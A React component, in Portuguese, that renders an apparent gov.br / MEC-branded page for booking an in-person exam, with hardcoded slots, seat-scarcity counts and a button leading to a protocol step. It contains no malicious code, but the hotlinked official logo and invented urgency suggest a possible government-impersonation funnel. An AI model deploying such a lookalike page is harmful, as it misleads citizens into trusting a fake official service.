import { useEffect, useState } from 'react'
import { useNavigate } from 'react-router-dom'
import GovHeader from '../components/gov/GovHeader.jsx'
import GovFooter from '../components/gov/GovFooter.jsx'

const GOV_LOGO = 'https://www.gov.br/++theme++padrao_govbr/img/govbr-colorido-b.png'

const SLOTS = [
  { date: '24/04 (Sexta-feira)', time: '14:00 - Turma Presencial A', vagas: 8, low: true },
  { date: '24/04 (Sexta-feira)', time: '19:00 - Turma Presencial B', vagas: 3, low: true },
  { date: '25/04 (Sábado)', time: '09:00 - Turma Presencial C', vagas: 15, low: false },
  { date: '27/04 (Segunda-feira)', time: '10:00 - Turma Presencial D', vagas: 22, low: false },
]

export default function AgendarProva() {
  const navigate = useNavigate()
  const [selected, setSelected] = useState(null)
  const [school, setSchool] = useState('Unidade MEC Padrão')

  useEffect(() => {
    document.body.classList.add('gov-body')
    return () => document.body.classList.remove('gov-body')
  }, [])

  useEffect(() => {
    const s = localStorage.getItem('exam_school')
    if (s) setSchool(s.toUpperCase())
  }, [])

  function confirm() {
    if (selected === null) return
    const s = SLOTS[selected]
    localStorage.setItem('exam_date', s.date)
    localStorage.setItem('exam_time', s.time)
    navigate('/gerando-protocolo')
  }

  return (
    <>
      <GovHeader />

      <div className="container-gov">
        <div className="breadcrumb flex items-center gap-2 py-6 text-sm text-blue-600">
          <svg className="w-5 h-5 text-blue-800" fill="currentColor" viewBox="0 0 24 24">
            <path d="M10 20v-6h4v6h5v-8h3L12 3 2 12h3v8z" />
          </svg>
          <span>&gt;</span>
          <span className="text-gray-500">Agendamento de Data e Horário</span>
        </div>

        <div
          style={{
            background: 'white',
            borderRadius: 8,
            padding: 40,
            margin: '40px auto',
            border: '1px solid #e2e8f0',
            maxWidth: 800,
            boxShadow: '0 1px 3px rgba(0,0,0,0.05)',
            borderTop: '4px solid #1351b4',
          }}
        >
          <h1 className="text-2xl font-black text-blue-900 mb-2 uppercase">
            Agendamento Oficial Presencial
          </h1>
          <p className="text-sm text-gray-700 mb-6 pb-6 border-b">
            A avaliação de competência internacional deve ser feita estritamente
            de maneira física sob a supervisão de um docente registrado no INEP,
            como parte da política anti-fraude. Selecione a melhor data e
            horário de agendamento na sua instituição física escolhida:
          </p>

          <div className="bg-gray-100 rounded-lg p-5 mb-8 border border-gray-300">
            <div className="text-[10px] uppercase font-black tracking-widest text-gray-500 mb-1">
              Local da Avaliação Física Requisitado:
            </div>
            <div className="font-bold text-blue-900 flex items-center justify-between">
              <span>{school}</span>
              <svg className="w-6 h-6 text-green-600" fill="currentColor" viewBox="0 0 20 20">
                <path
                  fillRule="evenodd"
                  d="M10 18a8 8 0 100-16 8 8 0 000 16zm3.707-9.293a1 1 0 00-1.414-1.414L9 10.586 7.707 9.293a1 1 0 00-1.414 1.414l2 2a1 1 0 001.414 0l4-4z"
                  clipRule="evenodd"
                />
              </svg>
            </div>
          </div>

          <div>
            {SLOTS.map((s, i) => {
              const isSel = selected === i
              const day = s.date.split('/')[0]
              return (
                <div
                  key={i}
                  onClick={() => setSelected(i)}
                  style={{
                    border: `1px solid ${isSel ? '#1351b4' : '#e2e8f0'}`,
                    borderRadius: 8,
                    padding: 15,
                    marginBottom: 12,
                    cursor: 'pointer',
                    transition: 'all 0.2s',
                    display: 'flex',
                    alignItems: 'center',
                    justifyContent: 'space-between',
                    background: isSel ? '#f0f7ff' : 'white',
                    boxShadow: isSel ? '0 0 0 1px #1351b4' : 'none',
                  }}
                >
                  <div className="flex items-center gap-4">
                    <div className="w-10 h-10 bg-gray-200 rounded-full flex items-center justify-center text-blue-900 font-black">
                      {day}
                    </div>
                    <div>
                      <div className="font-bold text-gray-800">{s.date}</div>
                      <div className="text-xs text-gray-500 font-mono italic">
                        {s.time}
                      </div>
                    </div>
                  </div>
                  <div
                    className={`text-[10px] font-black uppercase ${
                      s.low ? 'text-red-500' : 'text-green-600'
                    }`}
                  >
                    {s.vagas} vagas restantes na sala
                  </div>
                </div>
              )
            })}
          </div>

          <button
            onClick={confirm}
            disabled={selected === null}
            style={{
              backgroundColor: selected !== null ? '#1351b4' : '#9ca3af',
              color: 'white',
              padding: 14,
              borderRadius: 30,
              fontWeight: 'bold',
              width: '100%',
              marginTop: 30,
              textTransform: 'uppercase',
              border: 'none',
              cursor: selected !== null ? 'pointer' : 'not-allowed',
              fontSize: 15,
              boxShadow:
                '0 10px 15px -3px rgb(0 0 0 / 0.1), 0 4px 6px -4px rgb(0 0 0 / 0.1)',
            }}
          >
            Assegurar Data e Assinar Termo
          </button>
        </div>
      </div>

      <GovFooter logo={GOV_LOGO} />
    </>
  )
}
